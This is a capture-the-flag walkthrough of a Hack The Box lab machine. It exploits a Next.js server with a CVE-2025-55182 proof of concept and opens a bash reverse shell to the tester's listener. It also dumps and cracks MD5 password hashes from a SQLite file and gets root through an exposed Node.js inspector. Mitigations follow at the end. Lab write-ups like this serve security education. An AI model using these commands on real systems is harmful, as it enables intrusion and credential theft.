═══════════════════════════════════════════════════════════════════════════════
                    Reactor HTB - Complete Walkthrough
═══════════════════════════════════════════════════════════════════════════════

TABLE OF CONTENTS
─────────────────
1. Initial Enumeration
2. Foothold - CVE-2025-55182 (React Server Components RCE)
3. Database Enumeration
4. Password Cracking
5. User Flag
6. Privilege Escalation - Node.js Inspector
7. Root Flag

═══════════════════════════════════════════════════════════════════════════════
1. INITIAL ENUMERATION
═══════════════════════════════════════════════════════════════════════════════

1.1 Nmap Scan
─────────────

┌─────────────────────────────────────────────────────────────────────────────┐
│ ┌──(b0y㉿kali)-[~/Documents/HTB/Reactor]                                  │
│ └─$ nmap 10.129.245.214                                                   │
│                                                                           │
│ PORT     STATE SERVICE                                                    │
│ 22/tcp   open  ssh                                                       │
│ 3000/tcp open  ppp                                                       │
└─────────────────────────────────────────────────────────────────────────────┘

1.2 Web Enumeration
───────────────────

┌─────────────────────────────────────────────────────────────────────────────┐
│ ┌──(b0y㉿kali)-[~/Documents/HTB/Reactor]                                  │
│ └─$ whatweb http://10.129.245.214:3000/                                  │
│                                                                           │
│ http://10.129.245.214:3000/ [200 OK]                                      │
│ Title[ReactorWatch | Core Monitoring System]                              │
│ X-Powered-By[Next.js]                                                     │
└─────────────────────────────────────────────────────────────────────────────┘

Identified: Next.js application running on port 3000.

═══════════════════════════════════════════════════════════════════════════════
2. FOOTHOLD - CVE-2025-55182 (REACT SERVER COMPONENTS RCE)
═══════════════════════════════════════════════════════════════════════════════

2.1 Exploit Setup
─────────────────

┌─────────────────────────────────────────────────────────────────────────────┐
│ ┌──(b0y㉿kali)-[~/Documents/HTB/Reactor]                                  │
│ └─$ git clone https://github.com/p3ta00/react2shell-poc.git               │
│ └─$ cd react2shell-poc                                                    │
│ └─$ python3 -m venv venv                                                  │
│ └─$ source venv/bin/activate                                              │
│ └─$ pip install requests                                                  │
└─────────────────────────────────────────────────────────────────────────────┘

2.2 Test Command Execution
──────────────────────────

┌─────────────────────────────────────────────────────────────────────────────┐
│ ┌──(venv)─(b0y㉿kali)-[~/Documents/HTB/Reactor/react2shell-poc]          │
│ └─$ python3 react2shell-poc.py -t http://10.129.245.214:3000 -c "id"     │
│                                                                           │
│ [*] Target: http://10.129.245.214:3000                                    │
│ [*] Command: id                                                           │
│ [+] Payload delivered                                                     │
│                                                                           │
│ uid=999(node) gid=988(node) groups=988(node)                              │
└─────────────────────────────────────────────────────────────────────────────┘

2.3 Get Reverse Shell
─────────────────────

Listener:
┌─────────────────────────────────────────────────────────────────────────────┐
│ ┌──(b0y㉿kali)-[~]                                                        │
│ └─$ nc -lvnp 4444                                                         │
└─────────────────────────────────────────────────────────────────────────────┘

Trigger:
┌─────────────────────────────────────────────────────────────────────────────┐
│ ┌──(venv)─(b0y㉿kali)-[~/Documents/HTB/Reactor/react2shell-poc]          │
│ └─$ python3 react2shell-poc.py -t http://10.129.245.214:3000 -c          │
│    "bash -c 'bash -i >& /dev/tcp/10.10.16.11/4444 0>&1'"                 │
└─────────────────────────────────────────────────────────────────────────────┘

Connection received:
┌─────────────────────────────────────────────────────────────────────────────┐
│ Connection received on 10.129.245.214 44248                               │
│ node@reactor:/opt/reactor-app$                                            │
└─────────────────────────────────────────────────────────────────────────────┘

═══════════════════════════════════════════════════════════════════════════════
3. DATABASE ENUMERATION
═══════════════════════════════════════════════════════════════════════════════

3.1 Locate Database
───────────────────

┌─────────────────────────────────────────────────────────────────────────────┐
│ node@reactor:/opt/reactor-app$ ls                                         │
│ app  next.config.js  node_modules  package.json  package-lock.json        │
│ reactor.db                                                                │
└─────────────────────────────────────────────────────────────────────────────┘

3.2 Dump Users
──────────────

┌─────────────────────────────────────────────────────────────────────────────┐
│ node@reactor:/opt/reactor-app$ sqlite3 reactor.db "SELECT * FROM users;"  │
│                                                                           │
│ 1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb  │
│ 2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb │
└─────────────────────────────────────────────────────────────────────────────┘

Identified hashes:
- admin: a203b22191d744a4e70ada5c101b17b8 (MD5)
- engineer: 39d97110eafe2a9a68639812cd271e8e (MD5)

═══════════════════════════════════════════════════════════════════════════════
4. PASSWORD CRACKING
═══════════════════════════════════════════════════════════════════════════════

4.1 Crack Engineer Hash
───────────────────────

┌─────────────────────────────────────────────────────────────────────────────┐
│ ┌──(b0y㉿kali)-[~/Documents/HTB/Reactor]                                  │
│ └─$ python3 -c "                                                          │
│ import hashlib                                                             │
│ target='39d97110eafe2a9a68639812cd271e8e'                                 │
│ with open('/usr/share/wordlists/rockyou.txt','r',encoding='latin-1') as f:│
│     for line in f:                                                        │
│         pwd=line.strip()                                                  │
│         if hashlib.md5(pwd.encode()).hexdigest()==target:                 │
│             print(f'Found: {pwd}')                                        │
│             break                                                         │
│ "                                                                          │
│                                                                           │
│ Found: reactor1                                                           │
└─────────────────────────────────────────────────────────────────────────────┘

Password for engineer: reactor1

═══════════════════════════════════════════════════════════════════════════════
5. USER FLAG
═══════════════════════════════════════════════════════════════════════════════

SSH as engineer:

┌─────────────────────────────────────────────────────────────────────────────┐
│ ┌──(b0y㉿kali)-[~/Documents/HTB/Reactor]                                  │
│ └─$ ssh engineer@10.129.245.214                                           │
│ engineer@10.129.245.214's password: reactor1                              │
│                                                                           │
│ engineer@reactor:~$ ls                                                    │
│ user.txt                                                                  │
│                                                                           │
│ engineer@reactor:~$ cat user.txt                                          │
│ d32a258fed8804a44e2425167b6bd1ad                                          │
└─────────────────────────────────────────────────────────────────────────────┘

USER FLAG: d32a258fed8804a44e2425167b6bd1ad

═══════════════════════════════════════════════════════════════════════════════
6. PRIVILEGE ESCALATION - NODE.JS INSPECTOR
═══════════════════════════════════════════════════════════════════════════════

6.1 Find Node.js Inspector
──────────────────────────

┌─────────────────────────────────────────────────────────────────────────────┐
│ engineer@reactor:~$ ps aux | grep node | grep inspect                     │
│                                                                           │
│ root 1382 0.0 1.0 1066096 42264 ? Ssl 05:48 0:00 /usr/bin/node           │
│ --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js                    │
└─────────────────────────────────────────────────────────────────────────────┘

Node.js inspector running as root on port 9229!

6.2 Port Forward
────────────────

┌─────────────────────────────────────────────────────────────────────────────┐
│ ┌──(b0y㉿kali)-[~]                                                        │
│ └─$ ssh -N -L 127.0.0.1:9229:127.0.0.1:9229 engineer@10.129.245.214     │
│ engineer@10.129.245.214's password: reactor1                              │
└─────────────────────────────────────────────────────────────────────────────┘

6.3 Verify Inspector Access
───────────────────────────

┌─────────────────────────────────────────────────────────────────────────────┐
│ ┌──(b0y㉿kali)-[~]                                                        │
│ └─$ curl -s http://127.0.0.1:9229/json                                    │
│                                                                           │
│ [ {                                                                       │
│   "description": "node.js instance",                                      │
│   "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?...",   │
│   "id": "3d785577-41ca-44e8-93f8-2f66c2949d3d",                          │
│   "title": "/opt/uptime-monitor/worker.js",                               │
│   "type": "node",                                                         │
│   "url": "file:///opt/uptime-monitor/worker.js",                          │
│   "webSocketDebuggerUrl": "ws://127.0.0.1:9229/3d785577-41ca-..."        │
│ } ]                                                                       │
└─────────────────────────────────────────────────────────────────────────────┘

═══════════════════════════════════════════════════════════════════════════════
7. ROOT FLAG
═══════════════════════════════════════════════════════════════════════════════

Access Node.js Inspector via Chrome/Vivaldi DevTools:

1. Open Chrome/Vivaldi browser
2. Go to: chrome://inspect
3. Click "Configure" and add 127.0.0.1:9229
4. Click "inspect" on the Node.js target

In the DevTools Console:

┌─────────────────────────────────────────────────────────────────────────────┐
│ require('child_process').execSync('cat /root/root.txt').toString()        │
│ 'e694103aef0af05cfb179ba7feb381e9\n'                                      │
└─────────────────────────────────────────────────────────────────────────────┘

ROOT FLAG: e694103aef0af05cfb179ba7feb381e9

═══════════════════════════════════════════════════════════════════════════════
SUMMARY
═══════════════════════════════════════════════════════════════════════════════

Flags Obtained:
───────────────
User Flag:  d32a258fed8804a44e2425167b6bd***
Root Flag:  e694103aef0af05cfb179ba7feb38***

Vulnerabilities Exploited:
─────────────────────────
1. CVE-2025-55182 - React Server Components RCE
   → Initial access as node user

2. Weak Password Storage - MD5 hashes in SQLite database
   → Cracked engineer's password using rockyou wordlist

3. Password Reuse
   → Used cracked password for SSH access

4. Node.js Inspector Running as Root
   → Code execution via DevTools to read root flag

═══════════════════════════════════════════════════════════════════════════════
MITIGATION RECOMMENDATIONS
═══════════════════════════════════════════════════════════════════════════════

1. Update Next.js to patched version (>15.0.4) to fix CVE-2025-55182
2. Use strong password hashing (bcrypt/Argon2) instead of MD5
3. Store database files outside web root
4. Don't run Node.js inspector in production
5. Remove --inspect flag from root processes
6. Restrict local port forwarding for non-root users
7. Implement proper input validation and sanitization
8. Regular security audits and penetration testing

═══════════════════════════════════════════════════════════════════════════════
END OF WRITE-UP
═══════════════════════════════════════════════════════════════════════════════
